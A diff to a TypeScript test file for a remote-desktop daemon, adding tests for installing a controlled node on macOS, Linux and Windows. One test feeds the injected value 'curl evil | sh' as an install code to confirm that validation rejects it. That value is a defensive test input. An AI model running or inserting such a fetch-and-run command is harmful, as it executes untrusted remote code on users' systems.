@@ -14,6 +14,12 @@ import {
   REMOTE_DESKTOP_INSTALL_STATE,
 } from '../../shared/remote-desktop-install.js';
 import {
+  REMOTE_DESKTOP_LOGIN_SCREEN_ERROR,
+  REMOTE_DESKTOP_LOGIN_SCREEN_MSG,
+  REMOTE_DESKTOP_LOGIN_SCREEN_STATE,
+  controlledNodeInstallHereCapability,
+} from '../../shared/remote-desktop-login-screen.js';
+import {
   DaemonRemoteDesktop,
   daemonWorkerLaunchOptions,
   type DaemonRemoteDesktopDeps,
@@ -100,11 +106,76 @@ function fixture(overrides: Partial<DaemonRemoteDesktopDeps> & { installed?: boo
 }
 
 describe('DaemonRemoteDesktop', () => {
-  it('offers nothing on a platform that cannot serve remote control', () => {
+  it('on macOS, serves no remote control itself but offers to install the controlled node', () => {
     const f = fixture({ platform: 'darwin', arch: 'arm64' });
     expect(f.remoteDesktop.supported()).toBe(false);
-    expect(f.remoteDesktop.capabilities()).toEqual([]);
+    expect(f.remoteDesktop.capabilities()).toEqual([
+      controlledNodeInstallHereCapability({ os: 'mac', arch: 'universal' }),
+    ]);
     expect(f.remoteDesktop.installState()).toBe(REMOTE_DESKTOP_INSTALL_STATE.UNSUPPORTED);
+  });
+
+  it('installs the controlled node on its Linux computer with the owner\'s install code', async () => {
+    const installHere = vi.fn(async (input: { onState?: (state: 'downloading' | 'elevating') => void }) => {
+      input.onState?.('downloading');
+      input.onState?.('elevating');
+      return null;
+    });
+    const f = fixture({
+      platform: 'linux',
+      arch: 'x64',
+      installHere: installHere as unknown as DaemonRemoteDesktopDeps['installHere'],
+    });
+    expect(f.remoteDesktop.capabilities()).toEqual([
+      controlledNodeInstallHereCapability({ os: 'linux', arch: 'x64' }),
+    ]);
+
+    expect(await f.remoteDesktop.handle({
+      type: REMOTE_DESKTOP_LOGIN_SCREEN_MSG.REQUEST,
+      installCode: 'ABCDEFGHJKMN',
+    })).toBe(true);
+
+    expect(installHere).toHaveBeenCalledOnce();
+    expect(installHere.mock.calls[0]![0]).toMatchObject({ installCode: 'ABCDEFGHJKMN', platform: 'linux' });
+    expect(f.sent.filter((message) => message.type === REMOTE_DESKTOP_LOGIN_SCREEN_MSG.STATE)).toEqual([
+      { type: REMOTE_DESKTOP_LOGIN_SCREEN_MSG.STATE, state: REMOTE_DESKTOP_LOGIN_SCREEN_STATE.DOWNLOADING },
+      { type: REMOTE_DESKTOP_LOGIN_SCREEN_MSG.STATE, state: REMOTE_DESKTOP_LOGIN_SCREEN_STATE.ELEVATING },
+      { type: REMOTE_DESKTOP_LOGIN_SCREEN_MSG.STATE, state: REMOTE_DESKTOP_LOGIN_SCREEN_STATE.COMPLETED },
+    ]);
+  });
+
+  it('refuses an install request without a well-formed install code', async () => {
+    const installHere = vi.fn(async () => null);
+    const f = fixture({
+      platform: 'linux',
+      arch: 'x64',
+      installHere: installHere as unknown as DaemonRemoteDesktopDeps['installHere'],
+    });
+    await f.remoteDesktop.handle({
+      type: REMOTE_DESKTOP_LOGIN_SCREEN_MSG.REQUEST,
+      installCode: 'curl evil | sh',
+    });
+    expect(installHere).not.toHaveBeenCalled();
+    expect(f.sent.at(-1)).toEqual({
+      type: REMOTE_DESKTOP_LOGIN_SCREEN_MSG.STATE,
+      state: REMOTE_DESKTOP_LOGIN_SCREEN_STATE.FAILED,
+      error: REMOTE_DESKTOP_LOGIN_SCREEN_ERROR.DOWNLOAD_FAILED,
+    });
+  });
+
+  it('keeps Windows on its own ticket install', async () => {
+    const installHere = vi.fn(async () => null);
+    const installLoginScreen = vi.fn(async () => null);
+    const f = fixture({
+      installHere: installHere as unknown as DaemonRemoteDesktopDeps['installHere'],
+      installLoginScreen: installLoginScreen as unknown as DaemonRemoteDesktopDeps['installLoginScreen'],
+    });
+    await f.remoteDesktop.handle({
+      type: REMOTE_DESKTOP_LOGIN_SCREEN_MSG.REQUEST,
+      ticket: 'ticket_abcdefghijklmnop',
+    });
+    expect(installLoginScreen).toHaveBeenCalledOnce();
+    expect(installHere).not.toHaveBeenCalled();
   });
 
   it('offers nothing on Windows arm64, which has no worker build', () => {
